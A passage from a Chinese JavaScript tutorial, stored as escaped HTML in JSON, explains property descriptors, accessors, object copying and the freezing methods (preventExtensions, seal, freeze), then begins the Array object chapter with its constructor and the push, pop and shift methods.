&quot;p2&quot;]</code></pre><p>上面代码中，<code>obj.p1</code>是可遍历的，<code>obj.p2</code>是不可遍历的。<code>Object.getOwnPropertyNames</code>会将它们都返回。</p>\n<p>这跟<code>Object.keys</code>的行为不同，<code>Object.keys</code>只返回对象自身的可遍历属性的全部属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.keys([]) // []\nObject.getOwnPropertyNames([]) // [ &#039;length&#039; ]\n\nObject.keys(Object.prototype) // []\nObject.getOwnPropertyNames(Object.prototype)\n// [&#039;hasOwnProperty&#039;,\n//  &#039;valueOf&#039;,\n//  &#039;constructor&#039;,\n//  &#039;toLocaleString&#039;,\n//  &#039;isPrototypeOf&#039;,\n//  &#039;propertyIsEnumerable&#039;,\n//  &#039;toString&#039;]</code></pre><p>上面代码中，数组自身的<code>length</code>属性是不可遍历的，<code>Object.keys</code>不会返回该属性。第二个例子的<code>Object.prototype</code>也是一个对象，所有实例对象都会继承它，它自身的属性都是不可遍历的。</p>\n\n        <h2>\n            <a href='#Object.defineProperty()，Object.defineProperties()' class='header-anchor'>#</a>\n            <span>Object.defineProperty()，Object.defineProperties()</span>\n        </h2>\n    <p><code>Object.defineProperty</code>方法允许通过属性描述对象，定义或修改一个属性，然后返回修改后的对象，它的用法如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.defineProperty(object, propertyName, attributesObject)</code></pre><p><code>Object.defineProperty</code>方法接受三个参数，依次如下。</p>\n<ul>\n<li>属性所在的对象</li>\n<li>属性名（它应该是一个字符串）</li>\n<li>属性描述对象</li>\n</ul>\n<p>举例来说，定义<code>obj.p</code>可以写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 123,\n  writable: false,\n  enumerable: true,\n  configurable: false\n});\n\nobj.p // 123\n\nobj.p = 246;\nobj.p // 123</code></pre><p>上面代码中，<code>Object.defineProperty</code>方法定义了<code>obj.p</code>属性。由于属性描述对象的<code>writable</code>属性为<code>false</code>，所以<code>obj.p</code>属性不可写。注意，这里的<code>Object.defineProperty</code>方法的第一个参数是<code>{}</code>（一个新建的空对象），<code>p</code>属性直接定义在这个空对象上面，然后返回这个对象，这是<code>Object.defineProperty</code>的常见写法。</p>\n<p>如果属性已经存在，<code>Object.defineProperty</code>方法相当于更新该属性的属性描述对象。</p>\n<p>如果一次性定义或修改多个属性，可以使用<code>Object.defineProperties</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperties({}, {\n  p1: { value: 123, enumerable: true },\n  p2: { value: &#039;abc&#039;, enumerable: true },\n  p3: { get: function () { return this.p1 + this.p2 },\n    enumerable:true,\n    configurable:true\n  }\n});\n\nobj.p1 // 123\nobj.p2 // &quot;abc&quot;\nobj.p3 // &quot;123abc&quot;</code></pre><p>上面代码中，<code>Object.defineProperties</code>同时定义了<code>obj</code>对象的三个属性。其中，<code>p3</code>属性定义了取值函数<code>get</code>，即每次读取该属性，都会调用这个取值函数。</p>\n<p>注意，一旦定义了取值函数<code>get</code>（或存值函数<code>set</code>），就不能将<code>writable</code>属性设为<code>true</code>，或者同时定义<code>value</code>属性，否则会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nObject.defineProperty(obj, &#039;p&#039;, {\n  value: 123,\n  get: function() { return 456; }\n});\n// TypeError: Invalid property.\n// A property cannot both have accessors and be writable or have a value\n\nObject.defineProperty(obj, &#039;p&#039;, {\n  writable: true,\n  get: function() { return 456; }\n});\n// TypeError: Invalid property descriptor.\n// Cannot both specify accessors and a value or writable attribute</code></pre><p>上面代码中，同时定义了<code>get</code>属性和<code>value</code>属性，以及将<code>writable</code>属性设为<code>true</code>，就会报错。</p>\n<p><code>Object.defineProperty()</code>和<code>Object.defineProperties()</code>的第三个参数，是一个属性对象。它的<code>writable</code>、<code>configurable</code>、<code>enumerable</code>这三个属性的默认值都为<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nObject.defineProperty(obj, &#039;foo&#039;, {});\nObject.getOwnPropertyDescriptor(obj, &#039;foo&#039;)\n// {\n//   value: undefined,\n//   writable: false,\n//   enumerable: false,\n//   configurable: false\n// }</code></pre><p>上面代码中，定义<code>obj.p</code>时用了一个空的属性描述对象，就可以看到各个元属性的默认值。</p>\n\n        <h2>\n            <a href='#Object.prototype.propertyIsEnumerable()' class='header-anchor'>#</a>\n            <span>Object.prototype.propertyIsEnumerable()</span>\n        </h2>\n    <p>实例对象的<code>propertyIsEnumerable</code>方法返回一个布尔值，用来判断某个属性是否可遍历。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.p = 123;\n\nobj.propertyIsEnumerable(&#039;p&#039;) // true\nobj.propertyIsEnumerable(&#039;toString&#039;) // false</code></pre><p>上面代码中，<code>obj.p</code>是可遍历的，而继承自原型对象的<code>obj.toString</code>属性是不可遍历的。</p>\n\n        <h2>\n            <a href='#元属性' class='header-anchor'>#</a>\n            <span>元属性</span>\n        </h2>\n    <p>属性描述对象的各个属性称为“元属性”，因为它们可以看作是控制属性的属性。</p>\n\n        <h3>\n            <a href='#value' class='header-anchor'>#</a>\n            <span>value</span>\n        </h3>\n    <p><code>value</code>属性是目标属性的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.p = 123;\n\nObject.getOwnPropertyDescriptor(obj, &#039;p&#039;).value\n// 123\n\nObject.defineProperty(obj, &#039;p&#039;, { value: 246 });\nobj.p // 246</code></pre><p>上面代码是通过<code>value</code>属性，读取或改写<code>obj.p</code>的例子。</p>\n\n        <h3>\n            <a href='#writable' class='header-anchor'>#</a>\n            <span>writable</span>\n        </h3>\n    <p><code>writable</code>属性是一个布尔值，决定了目标属性的值（value）是否可以被改变。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nObject.defineProperty(obj, &#039;a&#039;, {\n  value: 37,\n  writable: false\n});\n\nobj.a // 37\nobj.a = 25;\nobj.a // 37</code></pre><p>上面代码中，<code>obj.a</code>的<code>writable</code>属性是<code>false</code>。然后，改变<code>obj.a</code>的值，不会有任何效果。</p>\n<p>注意，正常模式下，对<code>writable</code>为<code>false</code>的属性赋值不会报错，只会默默失败。但是，严格模式下会报错，即使对<code>a</code>属性重新赋予一个同样的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\nvar obj = {};\n\nObject.defineProperty(obj, &#039;a&#039;, {\n  value: 37,\n  writable: false\n});\n\nobj.a = 37;\n// Uncaught TypeError: Cannot assign to read only property &#039;a&#039; of object</code></pre><p>上面代码是严格模式，对<code>obj.a</code>任何赋值行为都会报错。</p>\n<p>如果原型对象的某个属性的<code>writable</code>为<code>false</code>，那么子对象将无法自定义这个属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var proto = Object.defineProperty({}, &#039;foo&#039;, {\n  value: &#039;a&#039;,\n  writable: false\n});\n\nvar obj = Object.create(proto);\n\nobj.foo = &#039;b&#039;;\nobj.foo // &#039;a&#039;</code></pre><p>上面代码中，<code>proto</code>是原型对象，它的<code>foo</code>属性不可写。<code>obj</code>对象继承<code>proto</code>，也不可以再自定义这个属性了。如果是严格模式，这样做还会抛出一个错误。</p>\n<p>但是，有一个规避方法，就是通过覆盖属性描述对象，绕过这个限制。原因是这种情况下，原型链会被完全忽视。</p>\n<pre class=\"prettyprint language-javascript\"><code>var proto = Object.defineProperty({}, &#039;foo&#039;, {\n  value: &#039;a&#039;,\n  writable: false\n});\n\nvar obj = Object.create(proto);\nObject.defineProperty(obj, &#039;foo&#039;, {\n  value: &#039;b&#039;\n});\n\nobj.foo // &quot;b&quot;</code></pre>\n        <h3>\n            <a href='#enumerable' class='header-anchor'>#</a>\n            <span>enumerable</span>\n        </h3>\n    <p><code>enumerable</code>（可遍历性）返回一个布尔值，表示目标属性是否可遍历。</p>\n<p>JavaScript 的早期版本，<code>for...in</code>循环是基于<code>in</code>运算符的。我们知道，<code>in</code>运算符不管某个属性是对象自身的还是继承的，都会返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n&#039;toString&#039; in obj // true</code></pre><p>上面代码中，<code>toString</code>不是<code>obj</code>对象自身的属性，但是<code>in</code>运算符也返回<code>true</code>，这导致了<code>toString</code>属性也会被<code>for...in</code>循环遍历。</p>\n<p>这显然不太合理，后来就引入了“可遍历性”这个概念。只有可遍历的属性，才会被<code>for...in</code>循环遍历，同时还规定<code>toString</code>这一类实例对象继承的原生属性，都是不可遍历的，这样就保证了<code>for...in</code>循环的可用性。</p>\n<p>具体来说，如果一个属性的<code>enumerable</code>为<code>false</code>，下面三个操作不会取到该属性。</p>\n<ul>\n<li><code>for..in</code>循环</li>\n<li><code>Object.keys</code>方法</li>\n<li><code>JSON.stringify</code>方法</li>\n</ul>\n<p>因此，<code>enumerable</code>可以用来设置“秘密”属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nObject.defineProperty(obj, &#039;x&#039;, {\n  value: 123,\n  enumerable: false\n});\n\nobj.x // 123\n\nfor (var key in obj) {\n  console.log(key);\n}\n// undefined\n\nObject.keys(obj)  // []\nJSON.stringify(obj) // &quot;{}&quot;</code></pre><p>上面代码中，<code>obj.x</code>属性的<code>enumerable</code>为<code>false</code>，所以一般的遍历操作都无法获取该属性，使得它有点像“秘密”属性，但不是真正的私有属性，还是可以直接获取它的值。</p>\n<p>注意，<code>for...in</code>循环包括继承的属性，<code>Object.keys</code>方法不包括继承的属性。如果需要获取对象自身的所有属性，不管是否可遍历，可以使用<code>Object.getOwnPropertyNames</code>方法。</p>\n<p>另外，<code>JSON.stringify</code>方法会排除<code>enumerable</code>为<code>false</code>的属性，有时可以利用这一点。如果对象的 JSON 格式输出要排除某些属性，就可以把这些属性的<code>enumerable</code>设为<code>false</code>。</p>\n\n        <h3>\n            <a href='#configurable' class='header-anchor'>#</a>\n            <span>configurable</span>\n        </h3>\n    <p><code>configurable</code>(可配置性）返回一个布尔值，决定了是否可以修改属性描述对象。也就是说，<code>configurable</code>为<code>false</code>时，<code>value</code>、<code>writable</code>、<code>enumerable</code>和<code>configurable</code>都不能被修改了。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  writable: false,\n  enumerable: false,\n  configurable: false\n});\n\nObject.defineProperty(obj, &#039;p&#039;, {value: 2})\n// TypeError: Cannot redefine property: p\n\nObject.defineProperty(obj, &#039;p&#039;, {writable: true})\n// TypeError: Cannot redefine property: p\n\nObject.defineProperty(obj, &#039;p&#039;, {enumerable: true})\n// TypeError: Cannot redefine property: p\n\nObject.defineProperty(obj, &#039;p&#039;, {configurable: true})\n// TypeError: Cannot redefine property: p</code></pre><p>上面代码中，<code>obj.p</code>的<code>configurable</code>为<code>false</code>。然后，改动<code>value</code>、<code>writable</code>、<code>enumerable</code>、<code>configurable</code>，结果都报错。</p>\n<p>注意，<code>writable</code>只有在<code>false</code>改为<code>true</code>会报错，<code>true</code>改为<code>false</code>是允许的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  writable: true,\n  configurable: false\n});\n\nObject.defineProperty(obj, &#039;p&#039;, {writable: false})\n// 修改成功</code></pre><p>至于<code>value</code>，只要<code>writable</code>和<code>configurable</code>有一个为<code>true</code>，就允许改动。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  writable: true,\n  configurable: false\n});\n\nObject.defineProperty(o1, &#039;p&#039;, {value: 2})\n// 修改成功\n\nvar o2 = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  writable: false,\n  configurable: true\n});\n\nObject.defineProperty(o2, &#039;p&#039;, {value: 2})\n// 修改成功</code></pre><p>另外，<code>configurable</code>为<code>false</code>时，直接目标属性赋值，不报错，但不会成功。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  configurable: false\n});\n\nobj.p = 2;\nobj.p // 1</code></pre><p>上面代码中，<code>obj.p</code>的<code>configurable</code>为<code>false</code>，对<code>obj.p</code>赋值是不会生效的。如果是严格模式，还会报错。</p>\n<p>可配置性决定了目标属性是否可以被删除（delete）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperties({}, {\n  p1: { value: 1, configurable: true },\n  p2: { value: 2, configurable: false }\n});\n\ndelete obj.p1 // true\ndelete obj.p2 // false\n\nobj.p1 // undefined\nobj.p2 // 2</code></pre><p>上面代码中，<code>obj.p1</code>的<code>configurable</code>是<code>true</code>，所以可以被删除，<code>obj.p2</code>就无法删除。</p>\n\n        <h2>\n            <a href='#存取器' class='header-anchor'>#</a>\n            <span>存取器</span>\n        </h2>\n    <p>除了直接定义以外，属性还可以用存取器（accessor）定义。其中，存值函数称为<code>setter</code>，使用属性描述对象的<code>set</code>属性；取值函数称为<code>getter</code>，使用属性描述对象的<code>get</code>属性。</p>\n<p>一旦对目标属性定义了存取器，那么存取的时候，都将执行对应的函数。利用这个功能，可以实现许多高级特性，比如某个属性禁止赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  get: function () {\n    return &#039;getter&#039;;\n  },\n  set: function (value) {\n    console.log(&#039;setter: &#039; + value);\n  }\n});\n\nobj.p // &quot;getter&quot;\nobj.p = 123 // &quot;setter: 123&quot;</code></pre><p>上面代码中，<code>obj.p</code>定义了<code>get</code>和<code>set</code>属性。<code>obj.p</code>取值时，就会调用<code>get</code>；赋值时，就会调用<code>set</code>。</p>\n<p>JavaScript 还提供了存取器的另一种写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  get p() {\n    return &#039;getter&#039;;\n  },\n  set p(value) {\n    console.log(&#039;setter: &#039; + value);\n  }\n};</code></pre><p>上面的写法与定义属性描述对象是等价的，而且使用更广泛。</p>\n<p>注意，取值函数<code>get</code>不能接受参数，存值函数<code>set</code>只能接受一个参数（即属性的值）。</p>\n<p>存取器往往用于，属性的值依赖对象内部数据的场合。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj ={\n  $n : 5,\n  get next() { return this.$n++ },\n  set next(n) {\n    if (n &gt;= this.$n) this.$n = n;\n    else throw new Error(&#039;新的值必须大于当前值&#039;);\n  }\n};\n\nobj.next // 5\n\nobj.next = 10;\nobj.next // 10\n\nobj.next = 5;\n// Uncaught Error: 新的值必须大于当前值</code></pre><p>上面代码中，<code>next</code>属性的存值函数和取值函数，都依赖于内部属性<code>$n</code>。</p>\n\n        <h2>\n            <a href='#对象的拷贝' class='header-anchor'>#</a>\n            <span>对象的拷贝</span>\n        </h2>\n    <p>有时，我们需要将一个对象的所有属性，拷贝到另一个对象，可以用下面的方法实现。</p>\n<pre class=\"prettyprint language-javascript\"><code>var extend = function (to, from) {\n  for (var property in from) {\n    to[property] = from[property];\n  }\n\n  return to;\n}\n\nextend({}, {\n  a: 1\n})\n// {a: 1}</code></pre><p>上面这个方法的问题在于，如果遇到存取器定义的属性，会只拷贝值。</p>\n<pre class=\"prettyprint language-javascript\"><code>extend({}, {\n  get a() { return 1 }\n})\n// {a: 1}</code></pre><p>为了解决这个问题，我们可以通过<code>Object.defineProperty</code>方法来拷贝属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var extend = function (to, from) {\n  for (var property in from) {\n    if (!from.hasOwnProperty(property)) continue;\n    Object.defineProperty(\n      to,\n      property,\n      Object.getOwnPropertyDescriptor(from, property)\n    );\n  }\n\n  return to;\n}\n\nextend({}, { get a(){ return 1 } })\n// { get a(){ return 1 } })</code></pre><p>上面代码中，<code>hasOwnProperty</code>那一行用来过滤掉继承的属性，否则会报错，因为<code>Object.getOwnPropertyDescriptor</code>读不到继承属性的属性描述对象。</p>\n\n        <h2>\n            <a href='#控制对象状态' class='header-anchor'>#</a>\n            <span>控制对象状态</span>\n        </h2>\n    <p>有时需要冻结对象的读写状态，防止对象被改变。JavaScript 提供了三种冻结方法，最弱的一种是<code>Object.preventExtensions</code>，其次是<code>Object.seal</code>，最强的是<code>Object.freeze</code>。</p>\n\n        <h3>\n            <a href='#Object.preventExtensions()' class='header-anchor'>#</a>\n            <span>Object.preventExtensions()</span>\n        </h3>\n    <p><code>Object.preventExtensions</code>方法可以使得一个对象无法再添加新的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nObject.preventExtensions(obj);\n\nObject.defineProperty(obj, &#039;p&#039;, {\n  value: &#039;hello&#039;\n});\n// TypeError: Cannot define property:p, object is not extensible.\n\nobj.p = 1;\nobj.p // undefined</code></pre><p>上面代码中，<code>obj</code>对象经过<code>Object.preventExtensions</code>以后，就无法添加新属性了。</p>\n\n        <h3>\n            <a href='#Object.isExtensible()' class='header-anchor'>#</a>\n            <span>Object.isExtensible()</span>\n        </h3>\n    <p><code>Object.isExtensible</code>方法用于检查一个对象是否使用了<code>Object.preventExtensions</code>方法。也就是说，检查是否可以为一个对象添加属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\n\nObject.isExtensible(obj) // true\nObject.preventExtensions(obj);\nObject.isExtensible(obj) // false</code></pre><p>上面代码中，对<code>obj</code>对象使用<code>Object.preventExtensions</code>方法以后，再使用<code>Object.isExtensible</code>方法，返回<code>false</code>，表示已经不能添加新属性了。</p>\n\n        <h3>\n            <a href='#Object.seal()' class='header-anchor'>#</a>\n            <span>Object.seal()</span>\n        </h3>\n    <p><code>Object.seal</code>方法使得一个对象既无法添加新属性，也无法删除旧属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;hello&#039; };\nObject.seal(obj);\n\ndelete obj.p;\nobj.p // &quot;hello&quot;\n\nobj.x = &#039;world&#039;;\nobj.x // undefined</code></pre><p>上面代码中，<code>obj</code>对象执行<code>Object.seal</code>方法以后，就无法添加新属性和删除旧属性了。</p>\n<p><code>Object.seal</code>实质是把属性描述对象的<code>configurable</code>属性设为<code>false</code>，因此属性描述对象不再能改变了。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;a&#039;\n};\n\n// seal方法之前\nObject.getOwnPropertyDescriptor(obj, &#039;p&#039;)\n// Object {\n//   value: &quot;a&quot;,\n//   writable: true,\n//   enumerable: true,\n//   configurable: true\n// }\n\nObject.seal(obj);\n\n// seal方法之后\nObject.getOwnPropertyDescriptor(obj, &#039;p&#039;)\n// Object {\n//   value: &quot;a&quot;,\n//   writable: true,\n//   enumerable: true,\n//   configurable: false\n// }\n\nObject.defineProperty(o, &#039;p&#039;, {\n  enumerable: false\n})\n// TypeError: Cannot redefine property: p</code></pre><p>上面代码中，使用<code>Object.seal</code>方法之后，属性描述对象的<code>configurable</code>属性就变成了<code>false</code>，然后改变<code>enumerable</code>属性就会报错。</p>\n<p><code>Object.seal</code>只是禁止新增或删除属性，并不影响修改某个属性的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\nObject.seal(obj);\nobj.p = &#039;b&#039;;\nobj.p // &#039;b&#039;</code></pre><p>上面代码中，<code>Object.seal</code>方法对<code>p</code>属性的<code>value</code>无效，是因为此时<code>p</code>属性的可写性由<code>writable</code>决定。</p>\n\n        <h3>\n            <a href='#Object.isSealed()' class='header-anchor'>#</a>\n            <span>Object.isSealed()</span>\n        </h3>\n    <p><code>Object.isSealed</code>方法用于检查一个对象是否使用了<code>Object.seal</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\n\nObject.seal(obj);\nObject.isSealed(obj) // true</code></pre><p>这时，<code>Object.isExtensible</code>方法也返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\n\nObject.seal(obj);\nObject.isExtensible(obj) // false</code></pre>\n        <h3>\n            <a href='#Object.freeze()' class='header-anchor'>#</a>\n            <span>Object.freeze()</span>\n        </h3>\n    <p><code>Object.freeze</code>方法可以使得一个对象无法添加新属性、无法删除旧属性、也无法改变属性的值，使得这个对象实际上变成了常量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;hello&#039;\n};\n\nObject.freeze(obj);\n\nobj.p = &#039;world&#039;;\nobj.p // &quot;hello&quot;\n\nobj.t = &#039;hello&#039;;\nobj.t // undefined\n\ndelete obj.p // false\nobj.p // &quot;hello&quot;</code></pre><p>上面代码中，对<code>obj</code>对象进行<code>Object.freeze()</code>以后，修改属性、新增属性、删除属性都无效了。这些操作并不报错，只是默默地失败。如果在严格模式下，则会报错。</p>\n\n        <h3>\n            <a href='#Object.isFrozen()' class='header-anchor'>#</a>\n            <span>Object.isFrozen()</span>\n        </h3>\n    <p><code>Object.isFrozen</code>方法用于检查一个对象是否使用了<code>Object.freeze</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;hello&#039;\n};\n\nObject.freeze(obj);\nObject.isFrozen(obj) // true</code></pre><p>使用<code>Object.freeze</code>方法以后，<code>Object.isSealed</code>将会返回<code>true</code>，<code>Object.isExtensible</code>返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;hello&#039;\n};\n\nObject.freeze(obj);\n\nObject.isSealed(obj) // true\nObject.isExtensible(obj) // false</code></pre><p><code>Object.isFrozen</code>的一个用途是，确认某个对象没有被冻结后，再对它的属性赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;hello&#039;\n};\n\nObject.freeze(obj);\n\nif (!Object.isFrozen(obj)) {\n  obj.p = &#039;world&#039;;\n}</code></pre><p>上面代码中，确认<code>obj</code>没有被冻结后，再对它的属性赋值，就不会报错了。</p>\n\n        <h3>\n            <a href='#局限性' class='header-anchor'>#</a>\n            <span>局限性</span>\n        </h3>\n    <p>上面的三个方法锁定对象的可写性有一个漏洞：可以通过改变原型对象，来为对象增加属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nObject.preventExtensions(obj);\n\nvar proto = Object.getPrototypeOf(obj);\nproto.t = &#039;hello&#039;;\nobj.t\n// hello</code></pre><p>上面代码中，对象<code>obj</code>本身不能新增属性，但是可以在它的原型对象上新增属性，就依然能够在<code>obj</code>上读到。</p>\n<p>一种解决方案是，把<code>obj</code>的原型也冻结住。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nObject.preventExtensions(obj);\n\nvar proto = Object.getPrototypeOf(obj);\nObject.preventExtensions(proto);\n\nproto.t = &#039;hello&#039;;\nobj.t // undefined</code></pre><p>另外一个局限是，如果属性值是对象，上面这些方法只能冻结属性指向的对象，而不能冻结对象本身的内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  foo: 1,\n  bar: [&#039;a&#039;, &#039;b&#039;]\n};\nObject.freeze(obj);\n\nobj.bar.push(&#039;c&#039;);\nobj.bar // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>上面代码中，<code>obj.bar</code>属性指向一个数组，<code>obj</code>对象被冻结以后，这个指向无法改变，即无法指向其他值，但是所指向的数组是可以改变的。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Array 对象","link":"/stdlib/array.html"}],"content":"\n        <h1>\n            <a href='#Array-对象' class='header-anchor'>#</a>\n            <span>Array 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#构造函数' class='header-anchor'>#</a>\n            <span>构造函数</span>\n        </h2>\n    <p><code>Array</code>是 JavaScript 的原生对象，同时也是一个构造函数，可以用它生成新的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = new Array(2);\narr.length // 2\narr // [ empty x 2 ]</code></pre><p>上面代码中，<code>Array</code>构造函数的参数<code>2</code>，表示生成一个两个成员的数组，每个位置都是空值。</p>\n<p>如果没有使用<code>new</code>，运行结果也是一样的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = new Array(2);\n// 等同于\nvar arr = Array(2);</code></pre><p><code>Array</code>构造函数有一个很大的缺陷，就是不同的参数，会导致它的行为不一致。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 无参数时，返回一个空数组\nnew Array() // []\n\n// 单个正整数参数，表示返回的新数组的长度\nnew Array(1) // [ empty ]\nnew Array(2) // [ empty x 2 ]\n\n// 非正整数的数值作为参数，会报错\nnew Array(3.2) // RangeError: Invalid array length\nnew Array(-3) // RangeError: Invalid array length\n\n// 单个非数值（比如字符串、布尔值、对象等）作为参数，\n// 则该参数是返回的新数组的成员\nnew Array(&#039;abc&#039;) // [&#039;abc&#039;]\nnew Array([1]) // [Array[1]]\n\n// 多参数时，所有参数都是返回的新数组的成员\nnew Array(1, 2) // [1, 2]\nnew Array(&#039;a&#039;, &#039;b&#039;, &#039;c&#039;) // [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;]</code></pre><p>可以看到，<code>Array</code>作为构造函数，行为很不一致。因此，不建议使用它生成新数组，直接使用数组字面量是更好的做法。</p>\n<pre class=\"prettyprint language-javascript\"><code>// bad\nvar arr = new Array(1, 2);\n\n// good\nvar arr = [1, 2];</code></pre><p>注意，如果参数是一个正整数，返回数组的成员都是空位。虽然读取的时候返回<code>undefined</code>，但实际上该位置没有任何值。虽然可以取到<code>length</code>属性，但是取不到键名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = new Array(3);\nvar b = [undefined, undefined, undefined];\n\na.length // 3\nb.length // 3\n\na[0] // undefined\nb[0] // undefined\n\n0 in a // false\n0 in b // true</code></pre><p>上面代码中，<code>a</code>是一个长度为3的空数组，<code>b</code>是一个三个成员都是<code>undefined</code>的数组。读取键值的时候，<code>a</code>和<code>b</code>都返回<code>undefined</code>，但是<code>a</code>的键位都是空的，<code>b</code>的键位是有值的。</p>\n\n        <h2>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#Array.isArray()' class='header-anchor'>#</a>\n            <span>Array.isArray()</span>\n        </h3>\n    <p><code>Array.isArray</code>方法返回一个布尔值，表示参数是否为数组。它可以弥补<code>typeof</code>运算符的不足。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\n\ntypeof arr // &quot;object&quot;\nArray.isArray(arr) // true</code></pre><p>上面代码中，<code>typeof</code>运算符只能显示数组的类型是<code>Object</code>，而<code>Array.isArray</code>方法可以识别数组。</p>\n\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#valueOf()，toString()' class='header-anchor'>#</a>\n            <span>valueOf()，toString()</span>\n        </h3>\n    <p><code>valueOf</code>方法是一个所有对象都拥有的方法，表示对该对象求值。不同对象的<code>valueOf</code>方法不尽一致，数组的<code>valueOf</code>方法返回数组本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\narr.valueOf() // [1, 2, 3]</code></pre><p><code>toString</code>方法也是对象的通用方法，数组的<code>toString</code>方法返回数组的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\narr.toString() // &quot;1,2,3&quot;\n\nvar arr = [1, 2, 3, [4, 5, 6]];\narr.toString() // &quot;1,2,3,4,5,6&quot;</code></pre>\n        <h3>\n            <a href='#push()，pop()' class='header-anchor'>#</a>\n            <span>push()，pop()</span>\n        </h3>\n    <p><code>push</code>方法用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\n\narr.push(1) // 1\narr.push(&#039;a&#039;) // 2\narr.push(true, {}) // 4\narr // [1, &#039;a&#039;, true, {}]</code></pre><p>上面代码使用<code>push</code>方法，往数组中添加了四个成员。</p>\n<p><code>pop</code>方法用于删除数组的最后一个元素，并返回该元素。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\narr.pop() // &#039;c&#039;\narr // [&#039;a&#039;, &#039;b&#039;]</code></pre><p>对空数组使用<code>pop</code>方法，不会报错，而是返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>[].pop() // undefined</code></pre><p><code>push</code>和<code>pop</code>结合使用，就构成了“后进先出”的栈结构（stack）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\narr.push(1, 2);\narr.push(3);\narr.pop();\narr // [1, 2]</code></pre><p>上面代码中，<code>3</code>是最后进入数组的，但是最早离开数组。</p>\n\n        <h3>\n            <a href='#shift()，unshift()' class='header-anchor'>#</a>\n            <span>shift()，unshift()</span>\n        </h3>\n    <p><code>shift</code>方法用于删除数组的第一个元素，并返回该元素。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.shift() // &#039;a&#039;\na // [&#039;b&#039;, &#039;c&#039;]</code></pre><p><code>shift</code>方法可以遍历并清空一个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var list = [1, 2, 3, 4, 5, 6];\nvar item;\n\nwhile (item = list.shift()) {\n  console.log(item);\n}\n\nlist // []</code></pre><p><code>push</code>和<code>shift</code>结合使用，就构成了“先进先出”的队列结构（queue）。</p>\n<p><code>unshift</code>方法用于在数组的第一个位置添加元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, 